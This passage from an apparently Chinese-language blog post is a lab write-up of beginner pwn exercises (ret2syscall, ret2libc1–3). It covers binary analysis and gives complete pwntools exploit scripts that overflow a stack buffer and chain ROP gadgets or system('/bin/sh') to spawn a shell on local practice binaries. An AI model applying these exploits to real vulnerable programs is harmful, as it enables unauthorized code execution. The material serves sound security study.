&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">pwn&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">struct&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">pwn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">process&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;./bin/ret2syscall&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># gadgets chain&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">gadget1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">pwn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">p32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x080bb196&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># pop eax; ret&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">eax&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">pwn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">p32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">11&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">gadget2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">pwn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">p32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x0806eb90&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># pop edx; pop ecx; pop ebx; ret&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">edx&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">pwn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">p32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">ecx&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">pwn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">p32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">ebx&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">pwn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">p32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x080be408&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">gadget3&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">pwn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">p32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x08049421&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># int 0x80&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">join&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;A&amp;#39;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">112&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">gadget1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">gadget2&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">edx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ecx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ebx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">gadget3&lt;/span>&lt;span class="p">])&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824143615364.png"
width="576"
height="326"
srcset="https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824143615364_hue1fc015f3eb8abbab4e390521870d2be_96854_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824143615364_hue1fc015f3eb8abbab4e390521870d2be_96854_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220824143615364"
class="gallery-image"
data-flex-grow="176"
data-flex-basis="424px"
>&lt;/p>
&lt;h2 id="ret2libc1">ret2libc1&lt;/h2>
&lt;h3 id="基本信息-3">基本信息&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl"># file
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bin/ret2libc1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=fb89c86b266de4ff294489da59959a62f7aa1e61, with debug_info, not stripped
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"># checksec
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CANARY : disabled
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">FORTIFY : disabled
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">NX : ENABLED
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PIE : disabled
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">RELRO : Partial
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="行为分析-3">行为分析&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">(.venv) vm :: repos/pwn/lab-4 » bin/ret2libc1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">RET2LIBC &amp;gt;_&amp;lt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">hi
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="反编译分析-3">反编译分析&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824144511924.png"
width="346"
height="274"
srcset="https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824144511924_huc3898cbd26261fafa9dbe37914e2eadc_9826_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824144511924_huc3898cbd26261fafa9dbe37914e2eadc_9826_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220824144511924"
class="gallery-image"
data-flex-grow="126"
data-flex-basis="303px"
>&lt;/p>
&lt;p>老样子。112偏移，看一眼有没有可利用的字符串。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">(.venv) vm :: repos/pwn/lab-4 » ROPgadget --binary bin/ret2libc1 --string &amp;#39;/bin/sh&amp;#39;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Strings information
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">============================================================
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x08048720 : /bin/sh
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>再看一眼 PLT 有没有 &lt;code>system&lt;/code> 函数。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">(.venv) vm :: repos/pwn/lab-4 » objdump -d -j .plt bin/ret2libc1 | grep system
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">08048460 &amp;lt;system@plt&amp;gt;:
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>接下来就简单了，直接写 exploit 。&lt;/p>
&lt;h3 id="exploit-3">exploit&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">process&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;./bin/ret2libc1&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">env&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">{})&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># &amp;amp;system reta &amp;#34;/bin/sh&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">flat&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;A&amp;#39;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">112&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x08048460&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x08048720&lt;/span>&lt;span class="p">]))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824150019457.png"
width="529"
height="142"
srcset="https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824150019457_hu3f9da3aecace7a315fedd4f993e87fc4_43234_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824150019457_hu3f9da3aecace7a315fedd4f993e87fc4_43234_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220824150019457"
class="gallery-image"
data-flex-grow="372"
data-flex-basis="894px"
>&lt;/p>
&lt;h2 id="ret2libc2">ret2libc2&lt;/h2>
&lt;h3 id="基本信息-4">基本信息&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl"># file
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bin/ret2libc2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=83535a471d9ef90c3d5ff7f077944fb6021787a1, with debug_info, not stripped
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"># checksec
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CANARY : disabled
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">FORTIFY : disabled
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">NX : ENABLED
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PIE : disabled
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">RELRO : Partial
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="行为分析-4">行为分析&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">(.venv) vm :: repos/pwn/lab-4 » bin/ret2libc2
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Something surprise here, but I don&amp;#39;t think it will work.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">What do you think ?no
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="反编译分析-4">反编译分析&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824151009192.png"
width="545"
height="248"
srcset="https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824151009192_hu998f81bff57390f93f7add16304dd4dc_12132_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824151009192_hu998f81bff57390f93f7add16304dd4dc_12132_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220824151009192"
class="gallery-image"
data-flex-grow="219"
data-flex-basis="527px"
>&lt;/p>
&lt;p>&lt;code>main&lt;/code> 函数里没有有用的内容。搜索 &lt;code>/bin/sh&lt;/code> 字符串无结果，但有 &lt;code>system&lt;/code> 函数。那我们考虑下怎么往里面填一个 &lt;code>/bin/sh&lt;/code> 。大致扫上一眼没有别的值得关注的地方，就开始考虑下怎么填字符串。&lt;/p>
&lt;p>填字符串最直接的办法就是往栈上压，然后栈上地址传给 &lt;code>system&lt;/code> 。缺点是这个做法在开启 PIE 的时候就没成功过，大概是栈上变量的地址一直在变。&lt;/p>
&lt;p>另一个办法是找个 RW 权限的内存段往里面写，然后把地址传给 &lt;code>system&lt;/code>。注意到导出符号有一个全局变量 &lt;code>buf2&lt;/code>。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824151516232.png"
width="808"
height="97"
srcset="https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824151516232_hua14393bc0c02aeb4d10acd8ae65d38a0_6808_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824151516232_hua14393bc0c02aeb4d10acd8ae65d38a0_6808_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220824151516232"
class="gallery-image"
data-flex-grow="832"
data-flex-basis="1999px"
>&lt;/p>
&lt;p>&lt;code>buf2&lt;/code> 是一个可写的全局变量，在&lt;code>.bss&lt;/code>段里，我们直接用它，配合 &lt;code>gets&lt;/code> 来控制程序读 &lt;code>/bin/sh&lt;/code> 字符串。&lt;/p>
&lt;p>预期的栈结构如下。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824151928918.png"
width="380"
height="211"
srcset="https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824151928918_hu46aa81efd2eff6f417a96b74e87a0121_7512_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824151928918_hu46aa81efd2eff6f417a96b74e87a0121_7512_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220824151928918"
class="gallery-image"
data-flex-grow="180"
data-flex-basis="432px"
>&lt;/p>
&lt;p>&lt;code>gets&lt;/code> 读取完&lt;code>/bin/sh&lt;/code>后直接跳转&lt;code>system&lt;/code>，原先作为&lt;code>gets&lt;/code>参数的&lt;code>buf2&lt;/code>地址就变成了&lt;code>system&lt;/code>的返回地址，不过我们不在乎。第二个&lt;code>buf2&lt;/code>则变成了&lt;code>system&lt;/code>的参数。&lt;/p>
&lt;p>从 plt 取 &lt;code>gets&lt;/code> 和 &lt;code>system&lt;/code> 函数的地址，然后开始写 exploit 。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">(.venv) vm :: repos/pwn/lab-4 » objdump -d -j .plt bin/ret2libc2 | grep system
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">08048490 &amp;lt;system@plt&amp;gt;:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">(.venv) vm :: repos/pwn/lab-4 » objdump -d -j .plt bin/ret2libc2 | grep gets
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">08048460 &amp;lt;gets@plt&amp;gt;:
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="exploit-4">exploit&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">process&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;./bin/ret2libc2&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">env&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">{})&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">flat&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;A&amp;#39;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">112&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x08048460&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x08048490&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x0804a080&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x0804a080&lt;/span>&lt;span class="p">]))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;/bin/sh&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824152429647.png"
width="560"
height="146"
srcset="https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824152429647_hu439c30787bd0a6b832c38ee2ef01b982_50569_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824152429647_hu439c30787bd0a6b832c38ee2ef01b982_50569_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220824152429647"
class="gallery-image"
data-flex-grow="383"
data-flex-basis="920px"
>&lt;/p>
&lt;h2 id="ret2libc3">ret2libc3&lt;/h2>
&lt;h3 id="基本信息-5">基本信息&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl"># file
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bin/ret2libc3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=c0ad441ebd58b907740c1919460c37bb99bb65df, with debug_info, not stripped
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"># checksec
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CANARY : disabled
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">FORTIFY : disabled
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">NX : ENABLED
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PIE : disabled
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">RELRO : Partial
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="行为分析-5">行为分析&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">(.venv) vm :: repos/pwn/lab-4 » bin/ret2libc3
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">No surprise anymore, system disappeard QQ.
